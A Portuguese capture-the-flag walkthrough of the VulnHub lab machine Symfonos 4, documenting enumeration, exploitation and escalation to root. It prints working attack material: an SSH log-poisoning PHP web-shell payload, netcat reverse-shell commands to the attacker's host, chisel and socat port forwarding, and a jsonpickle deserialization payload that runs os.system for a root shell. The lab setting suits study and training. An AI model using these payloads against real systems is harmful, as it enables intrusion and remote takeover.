---
title: "VulnHub - Symfonos 4"
tags: [Linux, Medium, Serialization, Python, Pyckles, LFI, SSH Log Poison, Wfuzz, Gobuster, Find, Chisel, Socat, Port Forwading, BurpSuite]
categories: VulnHub
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/inicial.png)

Link: <https://www.vulnhub.com/entry/symfonos-4,347/>

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 -> Servidor SSH

> Porta 80 -> Servidor Web

## Enumeração da Porta 80 (Web)

Entramos no site pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/web.png)

Rodamos o gobuster nele

```bash
gobuster dir -u http://192.168.56.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/gobuster.png)

Tanto o **atlantis.php** quanto o **sea.php** nos 'redirecionam' pra mesma página de login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/atlantis.png)

O diretorio **/gods** nos da o que parece uns arquivos de log

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/gods.png)

Verificamos do que se trata eles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/logs.png)

### Descobrindo LFI

Aqui eu demorei um bom tempo pra pegar a ideia desse LFI... se tentarmos entrar no **sea.php** ele automaticamente vai redirecionar para o **atlantis.php**, até ai tudo bem, testamos jogar para o burp pra ver o que poderiamos fazer e nada de útil... O que deve ser feito? Quando vc loga com qualquer usuário, mesmo um que de errado nesse atlantis.php, ele vai gerar um cookie (PHPSSESSID), e com esse cookie ao entrarmos de novo no **sea.php** temos uma surpresa

Devemos selecionar um 'god'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/sea.png)

Ao selecionarmos, o parâmetro é **file=**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/sea1.png)

### BruteForce LFI

Testei todo tipo de arquivo, e não fui capaz de ler nenhum, então resolvi fazer um bruteforce nele

O que é interessante é lembrar de adicionar o ../../../../../../../ antes do FUZZ...

```bash
wfuzz -c --hw 39 -b 'PHPSESSID=2vg4c4t2jlgs9l9eqn23dbptpi' -w '/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt' -u 'http://192.168.56.108/sea.php?file=../../../../../../../FUZZ'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/wfuzz.png)

Aqui eu fiz com essa wordlist, mas tanto faz qual você vai usar, desde que seja pra LFI, se não der uma, testa a outra.

Achamos algo em **/var/log/auth**, vamos ver o que é isso

É o arquivo que loga todas as tentativas de login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/wfuzz1.png)

# SSH Log Poison

[Referencia](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)

Bom, vamos fazer RCE através de um LFI e do SSH log poison...

Primeiro devemos envenenar o log dele

```bash
ssh '<?php system($_GET['cmd']); ?>'@192.168.56.108
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/ssh.png)

Testamos agora e vemos que temos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/ssh1.png)

## Reverse Shell

Agora, ficou fácil de pegarmos um shell reverso

```bash
cmd=nc -e /bin/bash 192.168.56.102 443
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/ssh2.png)

# WWW-Data -> Root

Assim que entramos na máquina, lemos o arquivo **atlantis.php** e encontramos as credenciais de acesso para o banco de dados

```
define('DB_USERNAME', 'root');        
define('DB_PASSWORD', 'yVzyRGw3cG2Uyt2r');
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/ssh3.png)

Então logamos nele e encontramos apenas um hash

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/sql.png)

Começamos a pesquisar por arquivos de interesse dentro do sistema... encontramos que a pasta /opt tem um data de modificação específica, que as outras pastas não tem

```bash
find / -regextype posix-extended -regex "/(sys|srv|proc|dev|usr|boot|var|etc|run|root)" -prune -o -type d -newermt 2019-08-18 ! -newermt 2019-08-19 -ls
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/find.png)

Parece ser algum script

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/find1.png)

Bom, parece estar executando algo...

## PSPY

Para descobrirmos os processos que estão sendo executados na máquina, usamos o [PSPY](https://github.com/DominicBreuker/pspy)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/pspy.png)

Passamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/pspy1.png)

Executamos e encontramos algo sendo executado na porta 8080

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/pspy2.png)

Com o comando **ps -aux \| grep 8080** confirmamos isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/pspy3.png)

## Port Forwading

Então vamos fazer um port forwading pra nossa máquina dessa porta 8080

### Chisel

Primeiro vamos fazer utilizando o [Chisel](https://github.com/jpillora/chisel)

Baixamos e passamos ele para a máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/chisel.png)

Setamos o Servidor e Cliente

```bash
# Servidor
/chisel server --host 192.168.56.102 --port 8000 --reverse
# Cliente
/chisel client 192.168.56.102:8000 R:5000:127.0.0.1:8080
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/chisel1.png)

Agora testamos e vemos que podemos acessar a página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/chisel2.png)

Agora vamos demonstrar outro modo

### SOCAT

Utilizando o socat

```bash
socat TCP-LISTEN:8888,fork TCP:127.0.0.1:8080
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/socat.png)

Agora acessamos a página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/socat1.png)

## Python Pickles

O que achei estranho foi ele redirecionar pra esse **/whoami**, então resolvi jogar pro burpsuite pra ver como ele se comporta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp.png)

Decoder, esse username me pareceu ser um base64, confirmamos isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp1.png)

Verificamos novamente o que aquele app faz, dentro do **/opt**

```python3
from flask import Flask, request, render_template, current_app, redirect
import jsonpickle
import base64
app = Flask(__name__)
class User(object):
    def __init__(self, username):
        self.username = username
@app.route('/')
def index():
    if request.cookies.get("username"):
        u = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
        return render_template("index.html", username=u.username)
    else:
        w = redirect("/whoami")
        response = current_app.make_response(w)
        u = User("Poseidon")
        encoded = base64.b64encode(jsonpickle.encode(u))
        response.set_cookie("username", value=encoded)
        return response
@app.route('/whoami')
def whoami():
    user = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
    username = user.username
    return render_template("whoami.html", username=username)
if __name__ == '__main__':
    app.run()
```

Vemos que ele importa o **Flask**, vamos explorar então

Encontramos esse [Artigo](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/) que abrange bem esse vulnerabilidade e como explorar ela... A vulnerabilidade está na hora em que ele encode e desencoda o base64, se passarmos algum código malicioso dentro dele, ele vai carregar e executar, por cima é mais ou menos isso que está acontecendo.

Então vamos fazer as mudanças necessárias, lembra daquele USERNAME que é um base64 que ele decode, vamos trabalhar com ele

Original:

```
{"py/object": "app.User", "username": "Poseidon"}
```

Modificado

```
{"py/object": "main.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["/usr/bin/nc -e /bin/bash 192.168.56.102 443"]}, null, null, null]}
```

Encondamos em base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp2.png)

Mandamos e viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/burp3.png)

## Pegamos a Flag

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/flag.png)